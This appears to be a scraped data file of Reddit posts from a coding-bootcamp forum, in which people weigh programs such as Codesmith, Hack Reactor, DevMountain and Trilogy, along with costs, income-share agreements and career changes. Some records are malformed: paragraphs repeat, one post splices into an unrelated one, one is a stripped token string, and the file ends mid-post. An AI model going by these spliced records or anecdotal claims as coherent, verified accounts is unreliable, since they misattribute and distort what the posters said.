I know Codesmith grads seem to have really good outcomes, almost a 90% job placement rate by 6 months in the last NYC CIRR report. But I noticed on LinkedIn many of the students have bachelor's degrees. Obviously, that would play a factor in their outcomes, and as someone without a degree, it gives me some doubts.

What percentage of Codesmith students have college degrees? A rough estimate is fine. And how would you compare the outcomes of students without degrees to those with one?

codingbootcamp,"Shit man. I’m (28m) in a rut. 

Basically, I’m training to become a full stack developer. The training has been nuts. 2.5 months, nonstop lectures and projects. I did pretty good in the beginning, but my problem is teams. 

Most people in my cohort have been coding for years. They’re knowledgable and efficient. I am a beginner and take days to defeat even one error. I don’t learn well in teams. I don’t want to ask questions and risk looking like a loser, since my teammates never ask questions unless they’re high level. I just… want to be myself, to be as bad and slow as I am without the pressure to perform. This gets worse, as interviews are later this week and soon I’ll be working with a company full of “elites”. 

I’m starting to hate coding. I can’t focus or problem solve or anything. I don’t know how to use the frameworks because I’ve never practiced. It’s just learn it through lectures and get thrown directly into development. No familiarization, no playing around, no testing. Just blah. 

I made the start of a solo project so I can give myself the opportunity to learn. But in the end, I don’t even want to do that anymore. 

Did anyone else have a spectacularly difficult time starting out? I feel like in five years I’ll look back and think, remember how unskilled and miserable I was? I just want to confirm. 

Before you say drop it, I don’t really want to. What else am I going to do? Besides, if I quit I owe the company 36k.

codingbootcamp,"Here's my first update! You can see my previous post about what I'm doing here.  


I loved my first week in this program. I'm shocked with how much I've learned in just 5 days. We started with exclusively Python. There is a LOT of homework after class is finished. I'm in the Central Time class so we go from 9 am - 6 pm CST. But you spend at least an extra hour or two every night to do the homework, practice problems and work with the class mentors. I don't mind though as I've set aside the time to commit full time to this program.  


I do wish there was a little more hands on programming time in this first week, but I've look ahead at the schedule and the next few weeks are much less lecture heavy. The first week was like almost 5 hours of lecture a day. But that makes sense since most of use have never touched anything to do with coding before. Like I've mentioned, I only knew a tiny bit of SQL before this class so it's definitely overwhelming. But it's not impossible.   


I can see why this is such a highly recommended program. I really feel like I learned so much more in a week than I ever could have on my own. I do wish I had done a little more preparation for the class by doing some python tutorials or something, but live and learn I guess haha.

codingbootcamp,"Hi all,

I am switching careers to software engineering, and plan on attending a bootcamp to speed the transition. I am looking into codesmith and rithm and wanted feedback on my overall impressions.

* Rithm appears more lecture based. Their lectures feel more organized and they emphasize small classes / instructor experience.

* Codesmith appears more project based, and learning is expected to take place outside of lecture.

* Rithm emphasizes realistic work scenarios (working through tickets on numbersapi.com) while Codesmith emphasizes projects that are optimized for a CV (creating an open source library)

* Codesmith's community feels more active that Rithm's community.

* Neither bootcamp has connections to existing tech companies for job placement

* Codesmith has a policy for lifetime post-graduation support (resume review, mock interviews). Does anybody have feedback on how realistic this is?

Overall, my feeling is that Codesmith and Rithm are quite similar but Codesmith emphasizes the non-coding aspect of software engineering more (peer programming, your personal story, CV optimized projects) while Rithm focuses more on the practical aspects of web development (fixing bugs, working on pre-existing codebases, code reviews from instructors). Is my assessment correct?

* Codesmith has a policy for lifetime post-graduation support (resume review, mock interviews). Does anybody have feedback on how realistic this is?

Overall, my feeling is that Codesmith and Rithm are quite similar but Codesmith emphasizes the non-coding aspect of software engineering more (peer programming, your personal story, CV optimized projects) while Rithm focuses more on the practical aspects of web development (fixing bugs, working on pre-existing codebases, code reviews from instructors). Is my assessment correct?

codingbootcamp,"So I'm taking the bootcamp Michigan State University is offering with Trilogy, and it's been 3 months since I started and it's been a struggle lately. This is coming from the perspective of someone who had no experience in actual coding before taking this class, the only coding I've ever used was LuaU, which is Roblox's version of Lua and is drastically different from the original Lua so I wouldn't count it as coding in my opinion. 

The main takeaway of this post is to give you guys an idea of what to expect if you are ever going to take a coding bootcamp from a University, most likely those bootcamps are run by Trilogy, or 2U, which are the same company now as they merged recently from what I heard.

&amp;#x200B;

**The interview**

* Before you sign up for the course, someone from the bootcamp calls you and asks you to complete an interview online and it was the most ridiculously easiest questionnaire ever. If you ever used a computer, you would be able to get all of the answers correctly.  You would have to pass this test in order to be admitted to the course, but if you have ever touched a computer or even a smartphone, you will definitely pass... I don't remember what the questions were, but it's related to how to use a computer properly, most of the questions had nothing to do with coding, just basic computer skills.

**The class activities**

* We use Zoom to attend class and Slack to send messages or resources. 
* The first week of the class, you start with the basics of HTML and then CSS and Javascript. The new things you learn every week are in pretty good progression where you learn those 3 basic languages for 6 weeks, then do a group project using everything you learned from those 6 weeks. This is also where you know to use Github to make commits and host the projects. We're near the 12-week mark where we will be doing our second project using everything we learned about the backend stuff such as Node.js, OOP, SQL, ORM, and MVC, and use either Postman or Insomnia for API testing. For the last 6 weeks, we will be going back to the front-end using React and PWA.
* Saturdays, Tuesdays, and Thursdays are our schedules for 3 hours of learning the week's material. 
* On Thursdays, we go over the mini-projects for the class activities as the week's material ends and the instructor puts us in breakout rooms to work in a group as practice. Honestly, nobody actually works on this together but it's good practice to see how you learned for the week and what you need to continue to work on.

**The Homework assignments**

* You're required to turn in homework assignments every week using Github to host them and submit the links to the Canvas website. They do check for plagiarism from Github and give you 0s if you copy work. It's so easy to fall behind on work, I'm falling behind currently because I had to reset my computer and reinstall everything again, but I'm pretty sure they allow late assignments to be submitted. I'm guilty of plagiarising and got caught because of that. 
* You're only allowed to miss 2 assignments. According to what the TA said, this means 2 assignments that were never submitted, not late assignments. If I follow what he said, it probably means that you can submit assignments even after weeks after they were due and still get credit. So you can submit assignments even if it was due 2 months ago.
* This is what's frustrating, odd weeks the homework has starter codes already made that you can finish and know exactly what to do. Even weeks require you to make one from scratch. This is very complicated for backend stuff for me with stuff like OOP where they require you to make the homework from scratch, it's almost like you're required to copy from somewhere on Github in order to even start and hope you don't get caught because they don't give you anything start with.

**The pacing**

* So I'm taking the part-time class, which is 6 months from May to November. I don't think there ever was a full-time class for my bootcamp, this is a problem because the pacing is extremely fast even for part-time, and I personally am not able to absorb the material we are learning. I'm aware we're supposed to learn the material in our free time outside of class as well, but the activities they give us require someone to go through it with us together in order to understand what's even going on. 
* As I mentioned before, 3 hours of class time for those 3 days. This isn't enough time to fully comprehend the material because of the part-time schedule which makes the course fly by fast, and after that they let you go free. There are about 5 people in my class who has coding experience so it's a lot easier for them, out of around 30 people who are mostly struggling as I am.
* You will be overwhelmed if you don't have prior coding experience as I am currently. I'm trying to overcome this by watching a bunch of Youtube tutorials in my free time, but the class goes by so fast that it's so difficult to keep up with the pace. The whole point of the course is to get you to a new workplace as soon as possible and learn buzz words quickly to put on your resume. 

**The cost**

* My University's bootcamp costs $12k. I pay around 1k a month, but bootcamps in general cost around 10k-15k. This is not cheap by any means, I would not be able to afford this without my parents' help. 
* You're allowed to get your refund before the first week ends, but the first week all you learn is HTML and it will seem easy for the first few weeks, then it gets difficult after that and you'll feel trapped. 

&amp;#x200B;

**So should you attend?**

* What you're getting out of this bootcamp is mainly the most popular coding languages and 3 group projects to put on your resume. 

**Yes if you're...**

* If you're not able to do self-taught coding, this may be great for you because you have a team of people guiding you through exactly what you need to know. 
* If you're extremely disciplined and can put more than at least 12 hours a week of your free time learning the material on YouTube and other platforms. It's very easy to fall behind if you're not highly motivated and disciplined.
* If you already have prior experience in coding, this will be great for you to update your skills and knowledge.
* If you need to get into a new workplace in under a year, this bootcamp will make you qualified for a new job quickly.
* The certificate doesn't really matter, jobs won't ask you to show one but it's just nice to have to hang on your wall. What jobs are asking is to see any projects or Github work, and this bootcamp does exactly those for you. 

**No if you're...**

* If you're coming directly out of high school, you shouldn't attend because if you thought high school was overwhelming, this will take it to the next level with all of the knowledge you need to absorb in such a short amount of time. Take a break and discover what you really want to do.
* If you don't like working in groups, you should not attend. There's just no way to do this bootcamp without working together. The 3 projects you're required to do requires everyone to give in all their best effort because you're going to use those projects on your portfolio and resume.
* If you need more time for an explanation to understand something, you won't really do well. It's an open secret, but asking for more details in the course is not really encouraged because the instructor doesn't have time to slow down. There's only 3 hours of class and they have to finish covering the activities for the day within that 3 hours. Other classmates may also get frustrated if you keep the class holding back by asking questions because they're also on schedule, they may have to go to work right after class and can't be delayed for questions.
* If you have problems with your computer that may require you to reset your pc like I did, such as your SSD space filling up, you will definitely fall behind. For the 6 months of the course, don't factory reset your computer or work on something internally on your computer because some mishaps will occur and make you fall behind on class assignments. 
* If you struggle with speaking English, you'll struggle with the class. You're required to have a microphone and webcam to ask questions, without those you may get by if you have experience in coding, but you'll struggle a lot because you won't be able to ask questions you may have directly in the Zoom class.

I probably shouldn't have attended, but I was pushed by my parents to because I don't have any real skills that will get me into some kind of workforce. I just finished college and went straight to this bootcamp for some reason, college didn't prepare me for anything in my opinion. If you'd like to know, I graduated with a Finance degree and I'm currently doing nothing related to finance, and my school didn't prepare me with anything except to show that I went to their college.  2U, the company that owns Trilogy, is a publicly traded company so of course I understand they need to make money somehow with them buying up a bunch of other companies like Chegg. 

If you have any doubt about yourself taking a rigorous fast-paced coding course, think very hard about it before even attending so you don't regret taking it. Find out what else you want to do in life. There's a bunch of people in my class that probably shouldn't have taken it as well, but since we're halfway through the course, we might as well just go through with it because we already spent $6k for the class. 

The main reason why I can mostly do the bootcamp is because the TA and instructor are really experienced in this stuff and know what they're doing. I believe I'm getting what I'm paying for because my instructor and TA are great, they encourage everyone to participate by calling on random people to see if they know what's going on. I've heard nightmare stories from other people's experiences but I guess we're lucky we have great people here.

If you guys have any questions please post them and I'll try to reply my best to them.",My Experience With Trilogy Bootcamp So Far 3 Months In,"So I'm taking the bootcamp Michigan State University is offering with Trilogy, and it's been 3 months since I started and it's been a struggle lately.

codingbootcamp,"Hi all! 

I’ve been lurking through this sub here the past few weeks and I think it’s time for me to make a decision. 

Since late 2019 i’ve been intrigued with the idea of joining a bootcamp and going into software dev. Of course since then, Covid (and life) has happened and i’m now in a position where I feel comfortable making a career change. 

I’ve been working in telecom sales and support my whole adult life (26M), and am in a role similar to an Account Exec at a SaaS company. I have 0 tech experience and no degree. 

In my current role i make around 95-105K a year, and realize that at least at first I would be taking something of a pay cut, but i’m wondering how much experience I would need to get closer to the 100K mark. I’ve also heard of folks getting job offers straight out of bootcamp, as well as horror stories from others that go almost a year without finding a job, and if they do it’s extremely low paying. 

I am looking more so for a self paced and flexible option, as I have plenty of time through my days to do bootcamp work, but my schedule changes daily (appointments and demos are booked on my behalf). Budget wise I am looking to stay in the bottom half (less than 7-8K total) and i’ve seen most of the self paced camps are on a monthly basis which is great. 

By searching this sub i’ve narrowed it down to a few options: Altcademy, NuCamp &amp; Udacity, but am super open to any recommendations, as well as any reviews from the ones i’ve looked into. 

Thank you all so much in advance!",Need advise on whether or not I should take the jump,"Hi all!

codingbootcamp,"TLDR: has anyone gotten out of their Leif ISA before it was paid off.



I’m currently dealing with a nightmare situation with Leif constantly changing my balance, changing amounts due, and not being to explain to me their calculations for achieving these numbers.

Their support options are awful, since it’s not a loan, the cs reps just send me links to knowledge articles without any explanation regarding my actual account.

-	I currently work in marketing and essentially manage our website via CMS.

-	 I know my way around HTML and CSS pretty r/well. I wouldn’t call myself an expert and I often have to look up code, but I am comfortable editing and changing these things on existing sites. I have never built anything from the ground up.

-	I’m not particularly fond of, not good at pretty much any form of advanced math.

Just wondering if I might be a good candidate or what other recommendations people may have for me.Would General Assembly software engineering track be good for me?",long dabbled getting world coding never done enough selfdiscipline selfpaced free course recently discovered general assembly wonder software engineering track might solution thing currently work marketing essentially manage website via cm way around html cs pretty rwell call expert often look code comfortable editing changing thing existing site never built anything ground particularly fond pretty form advanced math wondering might candidate recommendation may mewould general assembly software engineering track
codingbootcamp,"Hi all,

Just got into the two full-time programs mentioned above and am currently deciding between the two. Would love to hear any opinions on which one you guys think I should go for. 

Further, if anyone attended or knows someone who attended either course above, I would be very grateful if you would take some time and share your thoughts.

Currently I’m leaning App Academy, really simply because their admissions process was a lot more rigorous, with the 4 rounds of interviews including the live technical round I probably spent 10-20 hours prepping for, in which they tested in Ruby hashes, enumerables, etc. The general assembly interview process was a lot easier and shorter, and the technical stuff really only involved learning like 4 hours of basic HTML and CSS where they held my hand the whole time while learning and I never really needed to critically think. I know it’s not much to go off of, and the two syllabuses are really similar, but this is really why I’m leaning app Academy at the moment.

Further if anyone can link any real statistics on job placement rates and any other important stats for the two programs I would really appreciate it! (I’m well aware that the stats they advertise are misleading)

codingbootcamp,"Hi all! My name is Karl,   

I've been reflecting on my journey (Apple retail employee to iOS Dev, to running Devmountain and ultimately starting Stateful). When I first started, I wanted the lifestyle that being a developer could give, and I wanted a path to help make my and others' lives better but didn’t know where to start.  

One of the significant feelings that have stuck with me is how much I wished for someone to give me a chance, ya know? Like, I felt I was smart enough to learn what I needed to learn, but I needed someone to believe in and support me.  

I realized that I’ve never done anything to help others that may be feeling the same way.  

So I made a course that’s more support than content. The Introduction to Swift Course will **not** be enough to become a full iOS developer, but It will give you the structure and momentum to accomplish your goals. It’s my answer to my old self of where to start.

codingbootcamp,"Hi! I went to DevMountain and I found a job a little more than halfway through the program - for that reason, I dropped out of the bootcamp. Here is my impression:

The first half of the bootcamp was extremely valuable *if* you were either *in person* or very skilled at online learning. Many folks who were fully online seemed to be very disengaged. The first half is called 'Foundations' and we basically learned how to make a website. Javascript, HTML, CSS, a very minimal amount of Python. The instructors I had were engaged and good teachers, even if sometimes a little unprepared. The lectures and slides that they do are standardized for courses and carried through cohorts, so the person teaching you didn't necessarily make the slides. Both of my instructors were DevMountain grads. They are not paid very well, so they presumably could not find jobs elsewhere.

We got to the second half and it moved to fully online. This is also where you're no longer eligible for any refund. We were given a new instructor for the specialty we chose. My instructor was a recent DevMountain grad with no professional experience or prior knowledge of our specialty. We were assigned 2-6 hours of videos per day to watch, which was extremely fatiguing. There were no formal lectures, and assignments were often not very well correlated to what were learning and/or not correct or well-made.

The students across different specialties often got together to ask if they were struggling as much as everybody was - students in every specialty had issues with how the second half of this bootcamp was run and with the quality of instructors.

We were assigned mentors (experts in the field) who met with us an hour a day. I brought up these concerns to my mentor, who confirmed that I was not the first to bring it up and that mentors had proposed changes in the past and that these suggestions had largely been ignored.

I'm grateful that I got a job about two weeks into this second half of the bootcamp because it wasn't going to provide me with anything valuable. The job that I got is not dev-related and my time in the bootcamp had no bearing on their decision to hire me (they didn't even know I was in a bootcamp). Not everybody had my luck and I'd be surprised if anybody got anything valuable out of the second half of the bootcamp.

After I left, I was kicked from the Discord servers and my license for Pluralsight was revoked (I was told that I would access to this for a year after the bootcamp). When I contacted them about it, they said it was because DevMountain is moving to a different platform, but that doesn't change the fact that I was told I would access to Pluralsight for a year.

I'm just going to add - every single instructor I interacted with was a DevMountain bootcamp grad. I imagine this boosts their post-graduating employment numbers. One of the Outcomes folks (the team responsible for helping students and graduates find jobs) was a bootcamp grad who still wanted to work in the field but was having trouble getting hired in the field.

Screenshots from my DMs: https://imgur.com/a/bqZhutW    
And screenshots from general student dissatisfaction: https://imgur.com/a/NXGue3E

**TL;DR:** I do not recommend this bootcamp. The first half was great and very worthwhile if you stay engaged and work hard, but the second half was hot garbage and you'd be better off (and less broke) learning on your own than doing DevMountain. Specializations weren't useful.",DevMountain coding bootcamp review,"Hi! I went to DevMountain and I found a job a little more than halfway through the program - for that reason, I dropped out of the bootcamp. Here is my impression:

The first half of the bootcamp was extremely valuable *if* you were either *in person* or very skilled at online learning. Many folks who were fully online seemed to be very disengaged. The first half is called 'Foundations' and we basically learned how to make a website. Javascript, HTML, CSS, a very minimal amount of Python. The instructors I had were engaged and good teachers, even if sometimes a little unprepared. The lectures and slides that they do are standardized for courses and carried through cohorts, so the person teaching you didn't necessarily make the slides. Both of my instructors were DevMountain grads. They are not paid very well, so they presumably could not find jobs elsewhere.

We got to the second half and it moved to fully online. This is also where you're no longer eligible for any refund. We were given a new instructor for the specialty we chose. My instructor was a recent DevMountain grad with no professional experience or prior knowledge of our specialty. We were assigned 2-6 hours of videos per day to watch, which was extremely fatiguing. There were no formal lectures, and assignments were often not very well correlated to what were learning and/or not correct or well-made.

The students across different specialties often got together to ask if they were struggling as much as everybody was - students in every specialty had issues with how the second half of this bootcamp was run and with the quality of instructors.

We were assigned mentors (experts in the field) who met with us an hour a day. I brought up these concerns to my mentor, who confirmed that I was not the first to bring it up and that mentors had proposed changes in the past and that these suggestions had largely been ignored.

I'm grateful that I got a job about two weeks into this second half of the bootcamp because it wasn't going to provide me with anything valuable. The job that I got is not dev-related and my time in the bootcamp had no bearing on their decision to hire me (they didn't even know I was in a bootcamp). Not everybody had my luck and I'd be surprised if anybody got anything valuable out of the second half of the bootcamp.

After I left, I was kicked from the Discord servers and my license for Pluralsight was revoked (I was told that I would access to this for a year after the bootcamp). When I contacted them about it, they said it was because DevMountain is moving to a different platform, but that doesn't change the fact that I was told I would access to Pluralsight for a year.

I'm just going to add - every single instructor I interacted with was a DevMountain bootcamp grad. I imagine this boosts their post-graduating employment numbers. One of the Outcomes folks (the team responsible for helping students and graduates find jobs) was a bootcamp grad who still wanted to work in the field but was having trouble getting hired in the field.

**TL;DR:** I do not recommend this bootcamp.

codingbootcamp,"Dear r / codingbootcamp,   
I've been mostly self-taught after NuCamp Coding Bootcamp. No luck in finding a job with this ""education"" but I feel like if I do an immersive bootcamp like Flatiron, I'd have a better shot in landing a job after I finish their program. But I also don't have the wherewithal to pay for Flatiron, even with the loan options.   


Is it worth it just taking out a loan (potentially going into debt) and suck it up to do the full time immersive or just keep learning on my own and **try harder** to land a job--or even an interview for that matter, and spend little to no money at all?

i've graduated as an English language Major (BA) 5 years ago, did some small teaching gigs here and there but i feel like teaching isn't for me anymore and i got interested in learning Web Development/Data Science.

The thing is, i don't know where to start...

i'm aware of FreeCodeCamp and The Odin Project. I am learning from them as we speak. 

But i want to know if there are free Live Bootcamps (with attendance and stuff) that can help me learn and get a foot in the industry.

i've heard of Microverse but the sheer amount of bad reviews and their ill explanation of "" You only pay once you get a job "" made me question the fact of applying there.

I don't have the financial resources to pay 20k-30k upfront. Coming from a Third world country, that is a HUGE sum.  A  bootcamp that has a similar model Like Microverse (i.e pay a cut of your salary once you land a job ) will be fine by me.

codingbootcamp,"Hello all,

I have been following this subreddit for a while and a lot of questions about are about those reputable bootcamps out there Codesmith hack reactor etc. 

I am a 33 years old sales professional who is looking to change careers and get in to IT field. I  have no previous background however i love to explore and learn anything IT related. I have been researching Cloud and Devops engineering(AWS mostly) and can say i love it. 

I found some bootcamps who specifically focuses on DevOps tools and practices for job specific skills. I am suprised that there aren't many bootcamps out there specifically focus on Devops. Most of them are fullstack or data engineering etc. Is it harder to learn DevOps tools and practices without going through the fullstack curriculum first?

With economy is not doing so good lately and hiring in tech is slowing down, what are the chances of me completing a DevOps bootcamp and be able to get hired after? Bootcamp i plan to attend is a job specific tailored and not as reputable as the ones out there like hack reactor or app academy etc. My friend who attended and found a job fairly quickly was very happy with them but also said the more time and effort the greater the outcome is which i don\`t think i will have any problem there since i am very willing to make that career change for the future.

Do you think the name of the bootcamp make any impact during hiring process especially with no previous degree or background? Especially economy and hiring freezes all over the news is making me a little nervous about investing in a bootcamp during this time.

Hi. I am a junior studying Econ. I currently have very bad GPA, and I don't enjoy Economics much. I only have an year left to graduate, but because of my terrible GPA and depressing extracurricular activity, I don't see my self getting any jobs after graduation. I am thinking about moving back to my home state, and going to community college to transfer to my state school for CS. I wish that I can transfer directly to my state schools' CS program, but because of my bad GPA, I don't think I can. I thought about boot camp or self taught root to become software engineer, but bootcamp cost too much and self taught root seems very challenging. Moreover, imo CS degree will provide more chance to get in to the software engineering industry. Fortunately, I am 90 percent sure that I can go to state schools in my state for free.

The school that I currently attend is some what prestigious private school. My state has one of the best CS school, but I do not think I can transfer there with my current school's GPA bringing the average down.

codingbootcamp,"I need a job soon. My work history is a mess and I just started studying programming roughly 4 months ago. I know html, css, javascript, a bit of react and python that i'm not too comfortable doing. In my opinion I need to take advantage of one of these pay as you learn situations as they seem to be less risky than joining a bootcamp and putting all my eggs in one basket that says I will be hired after the bootcamp to cover the no doubt 15 to 20k debt the bootcamp will put me in. I just want a more gaurenteed route, I've looked up bootcamps like tech elevator and coding temple and sabio. I just don't want to put myself in debt for no reason. I've also looked into the WITCH programs such as infosys, cognizant, hcl etc. The only con to that is relocation would be crazy I don't even have 500 dollars to my name at the moment so moving to a whole new state sounds a bit crazy to me. I live in florida so there is the silver lining that there could be clients here since this is the east coast and I've heard tampa is a bit of a hub for tech companies. I guess I just want a bit of advice , I just want something more definite. I'm not afraid of pouring hours and hours into learning aslong as I know that learning will pay off. Also I have used resources such as freecodecamp the odin project and the havard csx50 course. Right now in freecodecamp I am learning more javascript which seems kind of easy but it hasn't completely set in yet. Also I've looked into apprenticeships like generation and other sponsored ones in florida and am open to them aswell.

My work history is a mess and I just started studying programming roughly 4 months ago. I know html, css, javascript, a bit of react and python that i'm not too comfortable doing. In my opinion I need to take advantage of one of these pay as you learn situations as they seem to be less risky than joining a bootcamp and putting all my eggs in one basket that says I will be hired after the bootcamp to cover the no doubt 15 to 20k debt the bootcamp will put me in. I just want a more gaurenteed route, I've looked up bootcamps like tech elevator and coding temple and sabio. I just don't want to put myself in debt for no reason. I've also looked into the WITCH programs such as infosys, cognizant, hcl etc. The only con to that is relocation would be crazy I don't even have 500 dollars to my name at the moment so moving to a whole new state sounds a bit crazy to me. I live in florida so there is the silver lining that there could be clients here since this is the east coast and I've heard tampa is a bit of a hub for tech companies. I guess I just want a bit of advice , I just want something more definite. I'm not afraid of pouring hours and hours into learning aslong as I know that learning will pay off. Also I have used resources such as freecodecamp the odin project and the havard csx50 course. Right now in freecodecamp I am learning more javascript which seems kind of easy but it hasn't completely set in yet. Also I've looked into apprenticeships like generation and other sponsored ones in florida and am open to them aswell.

codingbootcamp,"I took Hack Reactors Technical Admissions Assessment (TAA) last week Friday and felt pretty good. Got to question 13 (out of the 14 possible), and felt rather solid on my answers. Looking back, I made a few mistakes, but all the test functions they gave me passed. 

When they called me today to tell me that I had been accepted into the program, I specifically asked the pass rate of their TAA. The guy said he didn't have the info. Which is fine, up until I looked into what other redditors got over the last couple years, even found someone who posted earlier this year. Some folks were getting 7-9 right and getting in. 

Listen, I get it. Everyone learns differently, and especially tests differently. But if someone is getting to question 7 and getting accepted, I am concerned. For those that have not taken the Hack Reactor TAA, it is a 55 minute assessment of various JS problems that ramp up in difficulty. It is designed to not be completed, and is graded on the code and verbal walk through. Verbally talking about what you have done, even on the smaller questions, is the huge bottleneck here. 

The 7th question is really the 3rd or 4th (some questions are just test cases that works to remind you of a method or other concept), and is either a simple debugging question or a low level math equation that you have to make work in JS. Even getting up to the 9th question right just deals with arrays and objects. Now, I will admit that I have been doing a lot of practice on my own, but their prep program on JS covers all this in detail to crush this test. 

To me, this does not make me want to be a part of the program as I feel that they are accepting less than ideal candidates, which is immoral as all hell as they are setting them up for failure. Makes me think the program is not as rigorous or worth it to compensate.

What are your guys thoughts? Has Hack Reactors standards dropped? Am I looking into things more than I should?

codingbootcamp,"Hi all,

Started practicing recently and wanted to track my time and revisit list. I download some extensions but due to them being stale they had bugs or would not work. Also, I had to use excel sheet to maintain revisit list.

Hence took some time over the weekend (or 2) and developed a small extension. Sharing it with the community hoping others will find it useful. For now it works on leetcode. Will try to make it work on other platforms as well.

Here are the features so far

* Time tracking by problems and difficulty
* Bug tracking by problems and difficulty
* Revisit list of problems.
* Interview mode (show/hide difficulty, tags and hints)

codingbootcamp,"Hey everyone, I need advice

To summarize how I got the idea to get into software engineering, I am 19 and just graduated high school. I realized I wanted to live abroad eventually and be a digital nomad and hopefully within the next five years. Looked at common digital nomad jobs but a lot of them are more freelance work then actually working for a company, which is fine but don't think I would be comfortable being strictly freelance virtual assistant for example. But every list online has software engineering as a common digital nomad job which also pays well on average in comparison to the other jobs. 

However I don't have professional coding experience as I am just going into the ""real world"" you could say. I've done a lot of research on whats its like to be software engineer, success stories and the opposite. And when looking around online you either see ""I went to this bootcamp and got a job X months later that pays 100k"" or you see ""coding bootcamps are a waste and you can learn all of it by yourself and if companies don't see a degree they skip your resume."" 

So, if I am hoping to be a software engineer with good pay for a digital nomad (50k+) within the next 5 years should I learn as much as I can on my own and try to go to a top bootcamp or should I learn all i can then go for a Bachelors degree? 

&amp;#x200B;

Any relevant personal story and insight is appreciated.",Bootcamp or Degree. Beginner can't choose what direction to go,"Hey everyone, I need advice

codingbootcamp,"Hello all, I wanted to get some thoughts about the types of bootcamps that are there out there. I am an ME (mechanical engineer), but I really really want to transition to software as it is the future. I took Matlab course and I had a terrible time on the course, to the point I really struggled to write code. For some reason, coding was something I struggled a lot to understand and write, but then I am taking difficult courses like heat transfer and thermodynamics and solving problems! I don't know, but I always seem to learn better if I can recognize a pattern or get a hands on learning, otherwise I struggle a lot.

For coding, I want to learn but I realize I am someone who really needs the hands on 1-1 more and then I learn a lot better if you can show the patterns for codes and how to write them. That way I am able to understand better. Maybe this is me, but that is how I learn. For all these coding bootcamps, how do I pick one that focuses on teaching like this? Can anyone advise here?

codingbootcamp,"I’ve been self studying for the last month learned basic HTML and CSS from Odin project and free code camp. I’m going to be attending a program at the end of august from NYU that will also teach basic-intermediate HTML/CSS skills along with JavaScript. The program is 1 month long. After that I plan on self studying for another month JavaScript and then taking Hack reactors free pre courses to learn some more before I apply for their full time program. 

So I’ve seen many people here talking about getting 6 figure jobs after bootcamp and all that but I’m not sure how realistic that is. I would love to get a job like that, don’t get me wrong but I highly doubt it will happen. 

So I guess my point is that I’m very much happy with taking a entry level position or junior developer role paying anywhere from 30k-50k a year when just starting off.

I would love to find good tutorial or maybe even someone to help me / give advice to me.

codingbootcamp,"Like myself, a number of you have wondered aloud about the new [web development boot camp at Mimo.](https://dev.getmimo.com/)

Today I signed up for the boot camp after having secured a 20% discount.\* I went back and forth on whether or not I should go for something like [Thinkful](https://www.thinkful.com/) or [Bloomtech](https://www.bloomtech.com/), but Mimo made sense in the respect that I could go through this bootcamp and come out debt free on the other side. Additionally, I would be learning the same material that I would at the other camps I just mentioned. At least when it comes to front end development.

Given that there isn't a lot of material out there about Mimo\_Dev, I wanted to go ahead and get that review snowball rolling. I'm sure those of you who are signed up can come up with reviews of your own, but I thought I would at least get the conversation started. Here's what I've learned so far:

**Curriculum**

Right off the bat, when you sign up for Mimo\_Dev you're given an opportunity to complete Pre-work material. This is entry level course work on HTML and CSS, with various ""proficiency projects"" you can complete to hone your skills. This pre-work is not required but it is encouraged to be completed as it will set you up to be more prepared once your class starts.

The class will go forth in weekly sprints which will cover a particular topic. These topics will include, but are not limited to, HTML, CSS, JavaScript, React, SQL, Node.js, and final projects including building a CRUD app.

**Platform**

The Mimo\_Dev platform is very similar to what you would expect in the Mimo app. It's this very continuity that convinced me to join because everything feels like it was handcrafted, rather than borrowing from other online resources. Mimo\_Dev does use the Notion platform to explain certain development topics at length, but all of the exercises, practice material, and projects are contained within the Mimo\_Dev environment. It's very thoughtfully designed.

**Class**

I have limited knowledge on this aspect given that I've just signed up, but I'll be editing this post to include my experience with my advisors and peers.

**Location**

Given that the Mimo company is based in Austria, there is a time difference to consider when it comes down to staying in touch with advisors who are most likely working from a European time zone. But for the most part the company seems to be aware of this fact and has protocols in place to meet the needs of students in the US.

**So far...**

Overall I'm impressed with the platform so far. It looks like Mimo has finally found a way to provide students with an intensive web development experience from its own backyard, rather than having to partner with Bloomtech or Strive School (as they did in the past). The infrastructure appears to be solid and I'm eager to see how the class work unfolds as we learn and build projects together.

As I mentioned above, I'll be updating this post as I go, so feel free to save this and review it later on. I'll comment below when I've made any changes that may be worth looking into. 

^(\*Pro-tip: you can secure a discount yourself if you become a pro user of the Mimo app. Just work your way through the app and a discount for the boot camp should become available to you.

codingbootcamp,"Hi everyone, there is a lot of miss information regarding App Academy's in person 16 week program and I just am here to settle some common misconceptions 

1. A/A's passing the technical interview does not mean you are prepared for the bootcamp!

2. A/A wants to kick you out!
   1. This is also not true. Most tests are either on Monday or Tuesday. The week before, they will give you a study guide similar to the foundations test above, and they will also give a practice assessment the week before that is similar in difficulty to the real one. There are 6 in person tests, and you are able to completely flunk 1. And if you fail another, you will be given a retake of the same assessment later that day. (you will literally have all the questions). So in actuality you really only have to pass 4/6 on your first try. 
   2. Each test is done via TTD. You will be given problems with specs that need to pass. Even if you cannot answer the question generally each question has ""free"" specs that can be passed. For example declaring the function correctly generally passes a spec. So if a test is 6 questions, with 13 specs and only 10 are needed to pass.

codingbootcamp,"Hey everyone! I got into Hack Reactor and I'm currently trying to prep for the Codesmith technical interview. I'm wondering if I should put in the extra effort for Codesmith considering the technical interview is tougher or stick with Hack Reactor. I had some questions for those that are currently in the Hack Reactor program or have already graduated - 

1. What was the support system like at Hack Reactor from the staff? 
2. Were instructors engaging and easy to follow along? 
3. If students are struggling, do instructors spend extra time with the student to grasp the content?

1. What was the support system like at Hack Reactor from the staff? 
2. Were instructors engaging and easy to follow along? 
3. If students are struggling, do instructors spend extra time with the student to grasp the content?

codingbootcamp,"So I have very recently got into coding and I plan to practice over the summer for 1-2 hours a day. I also recently moved out into my own place and my mailbox is in a communal area and I have to go through the far entrance of my building to see if I have any mail which is quite annoying.  Would it be possible through python to code a sensor I could stick on the inside of my mailbox which through a app would alert me if I had any mail?

I am at the very beginning of my coding journey so I am unfamiliar with all the possibilities of learning to code. I am not necessarily being lazy but I tend to learn faster when I am working towards something and it would keep me motivated seeing something work that I have created.

codingbootcamp,"I'm looking for any and all feedback about my fantastical journey into a junior development role. Why is this fantastic? Because it seems more like a fantasy than a reality.

I have a strong liberal arts background (this is what you sarcastically call a BA) and don't have a lot of anxiety about my ability to learn languages. I've developed and deployed some really basic scripts, I can work via the command line, I've run my own unmanaged server: nothing I have done has been complicated or technical, but all of the ideas and techniques I have had to hack together have all made sense. I think I can learn.

But, I don't know if it makes a lot of sense for me to try to enter this field using a boot camp. The boot camp is crazy expensive, but I qualify via the VA's VRRAP program, so it's basically free. But the criteria to get in are basically pulse, funding from uncle sugar. It's not what you would call a selective program.  


Here's the program outline:  


